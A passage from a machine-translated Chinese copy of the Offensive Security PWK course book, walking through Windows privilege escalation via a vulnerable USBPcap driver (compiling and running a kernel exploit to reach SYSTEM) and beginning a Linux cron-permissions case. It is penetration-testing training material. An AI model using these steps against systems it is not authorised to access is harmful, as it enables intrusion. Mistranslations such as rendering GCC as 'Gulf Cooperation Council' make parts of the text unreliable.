<div style="position:absolute;top:143169;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 579 - 查找 USBPcap 目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:143198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以看到，在 C:\Program Files 中有一个 USBPcap 目录。</font><font style="vertical-align: inherit;">但是，请记住，</font></font></nobr></div>
<div style="position:absolute;top:143218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动程序目录通常位于 C:\Windows\System32\DRIVERS 下。</font><font style="vertical-align: inherit;">让我们检查一下内容</font></font></nobr></div>
<div style="position:absolute;top:143237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USBPcap.inf </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">537</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以了解有关驱动程序版本的更多信息：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:143272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files\USBPcap&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入 USBPcap.inf</font></font></font></b></nobr></div>
<div style="position:absolute;top:143289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[版本]</font></font></nobr></div>
<div style="position:absolute;top:143306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">签名    </font></font></nobr></div>
<div style="position:absolute;top:143306;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">= "$WINDOWS NT$"</font></font></nobr></div>
<div style="position:absolute;top:143323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">班级    </font></font></nobr></div>
<div style="position:absolute;top:143323;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">= USB</font></font></nobr></div>
<div style="position:absolute;top:143340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类向导    </font></font></nobr></div>
<div style="position:absolute;top:143340;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">= {36FC9E60-C465-11CF-8056-444553540000}</font></font></nobr></div>
<div style="position:absolute;top:143357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DriverPackageType = 类过滤器</font></font></nobr></div>
<div style="position:absolute;top:143374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供者    </font></font></nobr></div>
<div style="position:absolute;top:143374;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">= %提供者%</font></font></nobr></div>
<div style="position:absolute;top:143391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CatalogFile.NTx86 = USBPcapx86.cat</font></font></nobr></div>
<div style="position:absolute;top:143408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CatalogFile.NTamd64 = USBPcapamd64.cat</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:143425;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DriverVer=10/02/2015,1.1.0.0</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:143459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[目的地目录]</font></font></nobr></div>
<div style="position:absolute;top:143476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认目标目录 = 12</font></font></nobr></div>
<div style="position:absolute;top:143492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:143512;left:355"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 580 - USBPcap.inf 的内容</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:143541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据版本信息，我们的驱动程序应该是易受攻击的。</font><font style="vertical-align: inherit;">在我们尝试利用它之前，我们首先</font></font></nobr></div>
<div style="position:absolute;top:143561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为它是用 C 编写的，所以必须编译该漏洞。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:143595;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.6.1 在 Windows 上编译 C/C++ 代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:143630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝大多数针对内核级漏洞的漏洞利用（包括我们拥有的漏洞）</font></font></nobr></div>
<div style="position:absolute;top:143649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择）是用 C 或 C++ 等低级编程语言编写的，因此需要</font></font></nobr></div>
<div style="position:absolute;top:143668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汇编。</font><font style="vertical-align: inherit;">理想情况下，我们会在要运行的平台版本上编译代码。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:143687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这些情况下，我们只需创建一个与我们的目标匹配的虚拟机并编译</font></font></nobr></div>
<div style="position:absolute;top:143707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码在那里。</font><font style="vertical-align: inherit;">但是，我们也可以在完全不同的操作系统上交叉编译代码</font></font></nobr></div>
<div style="position:absolute;top:143726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从我们的目标。</font><font style="vertical-align: inherit;">例如，我们可以在 Kali 系统上编译 Windows 二进制文件。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:143795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">537 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-hardware/drivers/install/overview-of-inf-files</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:143923;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="122"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 122 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:143956;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:145033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:145033;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:145033;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">563</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:144052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，就本模块而言，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mingw-w64</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">538</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它为我们提供了</font></font></nobr></div>
<div style="position:absolute;top:144071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 上的 GCC 编译器。</font></font></nobr></div>
<div style="position:absolute;top:144104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们的 Windows 客户端已经预装了 Mingw-w64，我们可以运行 mingw-w64.bat 脚本</font></font></nobr></div>
<div style="position:absolute;top:144123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为 gcc 可执行文件</font><font style="vertical-align: inherit;">设置</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PATH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境变量。</font><font style="vertical-align: inherit;">脚本完成后，我们可以</font></font></nobr></div>
<div style="position:absolute;top:144143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以确认一切正常：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:144178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mingw-w64.bat</font></font></font></b></nobr></div>
<div style="position:absolute;top:144211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1&gt;echo off</font></font></nobr></div>
<div style="position:absolute;top:144228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.10240]</font></font></nobr></div>
<div style="position:absolute;top:144246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2015 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:144279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc</font></font></font></b></nobr></div>
<div style="position:absolute;top:144296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc：致命错误：没有输入文件</font></font></nobr></div>
<div style="position:absolute;top:144313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编译终止。</font></font></nobr></div>
<div style="position:absolute;top:144347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc --help</font></font></font></b></nobr></div>
<div style="position:absolute;top:144364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：gcc [选项] 文件...</font></font></nobr></div>
<div style="position:absolute;top:144381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:144398;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-pass-exit-codes    </font></font></nobr></div>
<div style="position:absolute;top:144398;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从一个阶段以最高错误代码退出。</font></font></nobr></div>
<div style="position:absolute;top:144415;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 帮助    </font></font></nobr></div>
<div style="position:absolute;top:144415;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示此信息。</font></font></nobr></div>
<div style="position:absolute;top:144432;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--目标帮助    </font></font></nobr></div>
<div style="position:absolute;top:144432;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示特定于目标的命令行选项。</font></font></nobr></div>
<div style="position:absolute;top:144449;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--help={common|optimizers|params|target|warnings|[^]{joined|separate|undocumented}}[</font></font></nobr></div>
<div style="position:absolute;top:144466;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示特定类型的命令行选项。</font></font></nobr></div>
<div style="position:absolute;top:144483;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（使用“-v --help”显示子进程的命令行选项）。</font></font></nobr></div>
<div style="position:absolute;top:144500;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 版本    </font></font></nobr></div>
<div style="position:absolute;top:144500;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示编译器版本信息。</font></font></nobr></div>
<div style="position:absolute;top:144517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:144536;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 581 - gcc 在运行 mingw-w64.bat 后工作</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:144566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的。</font><font style="vertical-align: inherit;">编译器似乎在工作。</font><font style="vertical-align: inherit;">现在让我们将漏洞利用代码传输到我们的 Windows 客户端</font></font></nobr></div>
<div style="position:absolute;top:144585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并尝试编译它。</font><font style="vertical-align: inherit;">由于作者没有提到任何特定的编译选项，我们</font></font></nobr></div>
<div style="position:absolute;top:144604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-o</font></font></b><font style="vertical-align: inherit;">指定输出文件名外，</font><font style="vertical-align: inherit;">将尝试在</font><font style="vertical-align: inherit;">没有任何参数的情况下</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:144983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">538 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Mingw-w64, 2019), https://mingw-w64.org/doku.php</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:145111;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="123"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 123 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:145144;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:146221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:146221;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:146221;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">564</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:145622;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 291：使用 gcc 编译漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:145653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管有两条警告消息，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">539</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用编译成功并且 gcc 创建了</font></font></nobr></div>
<div style="position:absolute;top:145673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用.exe可执行文件。</font><font style="vertical-align: inherit;">如果进程产生了错误信息，编译将有</font></font></nobr></div>
<div style="position:absolute;top:145692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中止，我们将不得不尝试修复漏洞利用代码并重新编译它。</font></font></nobr></div>
<div style="position:absolute;top:145725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经编译了我们的漏洞利用，我们可以将它传输到我们的目标机器并尝试运行</font></font></nobr></div>
<div style="position:absolute;top:145744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它。</font><font style="vertical-align: inherit;">为了确定我们的提权是否成功，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:145763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行我们的漏洞利用之前和之后的命令：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:146171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">539 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（海湾合作委员会，2019 年），https://gcc.gnu.org/onlinedocs/gcc/Warnings-and-Errors.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:146299;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="124"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 124 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:146332;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:147409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:147409;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:147409;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">565</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:146938;left:226"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 292：通过权限提升漏洞提升 Windows 权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:146969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">伟大的！</font><font style="vertical-align: inherit;">我们已成功将权限从 admin-pc\n00b 提升到 nt authority\system, </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">540</font></font></font></nobr></div>
<div style="position:absolute;top:146988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是具有最高权限级别的 Windows 帐户。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:147025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3 Linux 提权示例</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:147067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将把注意力转向基于 Linux 的目标。</font><font style="vertical-align: inherit;">我们将讨论 Linux 权限</font></font></nobr></div>
<div style="position:absolute;top:147086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并演示一些常见的基于 Linux 的权限提升技术。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:147121;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.1</font></font></i></nobr></div>
<div style="position:absolute;top:147121;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解 Linux 权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:147159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在讨论提权技术之前，让我们花点时间简单讨论一下 Linux</font></font></nobr></div>
<div style="position:absolute;top:147178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限、访问控制和用户。</font></font></nobr></div>
<div style="position:absolute;top:147211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 和其他 UNIX 衍生产品的定义特征之一是大多数资源，包括</font></font></nobr></div>
<div style="position:absolute;top:147230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件、目录、设备甚至网络通信都在文件系统中表示。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">541</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:147339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">540 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/ms684190 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:147359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">541 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Arch Linux，2019），https://wiki.archlinux.org/index.php/users_and_groups</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:147487;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="125"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 125 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:147520;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:148597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:148597;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:148597;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">566</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:147616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通俗地说，“一切都是文件”。</font><font style="vertical-align: inherit;">每个文件（以及 Linux 系统的每个元素）</font></font></nobr></div>
<div style="position:absolute;top:147635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">遵守</font><font style="vertical-align: inherit;">基于三个主要能力</font><font style="vertical-align: inherit;">的用户和组权限</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">542</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读取</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">写入</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:147670;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.3.2</font></font></i></nobr></div>
<div style="position:absolute;top:147670;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不安全的文件权限：Cron 案例研究</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:147708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们将注意力转向权限提升技术时，我们将首先利用不安全的文件</font></font></nobr></div>
<div style="position:absolute;top:147727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限。</font><font style="vertical-align: inherit;">与我们的 Windows 示例一样，我们假设我们已经获得了访问权限</font></font></nobr></div>
<div style="position:absolute;top:147746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以非特权用户身份访问我们的 Linux 目标机器。</font></font></nobr></div>
<div style="position:absolute;top:147779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了利用不安全的文件权限，我们必须找到一个可执行文件，它不仅允许</font></font></nobr></div>
<div style="position:absolute;top:147798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们写访问，但也运行在提升的权限级别。</font><font style="vertical-align: inherit;">在 Linux 系统上，cron </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">543</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间-</font></font></nobr></div>
<div style="position:absolute;top:147818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于作业调度程序是主要目标，因为系统级调度作业是由 root 用户执行的</font></font></nobr></div>
<div style="position:absolute;top:147837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权和系统管理员经常为具有不安全权限的 cron 作业创建脚本。</font></font></nobr></div>
<div style="position:absolute;top:147870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出于本示例的目的，我们将通过 SSH 连接到我们的专用 Debian 客户端。</font><font style="vertical-align: inherit;">在上一节中，</font></font></nobr></div>
<div style="position:absolute;top:147889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们展示了如何在文件系统上查找目标系统上已安装的 cron 作业。</font><font style="vertical-align: inherit;">我们可以</font></font></nobr></div>
<div style="position:absolute;top:147908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还要检查 cron 日志文件 (/var/log/cron.log) 以运行 cron 作业：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:147943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep "CRON" /var/log/cron.log</font></font></font></b></nobr></div>
<div style="position:absolute;top:147960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jan27 15:55:26 受害者 cron[719]：（CRON）信息（pidfile fd = 3）</font></font></nobr></div>
<div style="position:absolute;top:147977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jan27 15:55:26 受害者 cron[719]：（CRON）信息（运行 @reboot 作业）</font></font></nobr></div>
<div style="position:absolute;top:147994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:148011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jan27 17:45:01 受害者</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CRON</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> [2615]:( </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) CMD (cd /var/scripts/ &amp;&amp; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./user_backups.sh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></nobr></div>
